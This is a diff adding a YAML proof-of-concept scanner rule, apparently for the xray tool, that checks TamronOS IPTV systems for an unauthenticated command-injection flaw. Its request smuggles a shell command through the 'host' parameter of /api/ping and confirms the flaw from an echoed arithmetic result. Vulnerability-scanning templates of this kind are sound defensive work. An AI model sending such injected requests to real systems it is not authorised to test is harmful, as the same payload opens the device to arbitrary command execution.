@@ -1,0 +1,15 @@
+name: poc-yaml-tamronos-iptv-rce
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: /api/ping?count=5&host=;echo%20$(expr%20{{r1}}%20%2b%20{{r2}}):{{r1}}:{{r1}};&port=80&source=1.1.1.1&type=icmp
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
+detail:
+  author: Print1n
+  description: TamronOS IPTV系统存在前台命令执行漏洞
+  links:
+    - https://print1n.top/post/Other/TamronOS_IPTV%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E
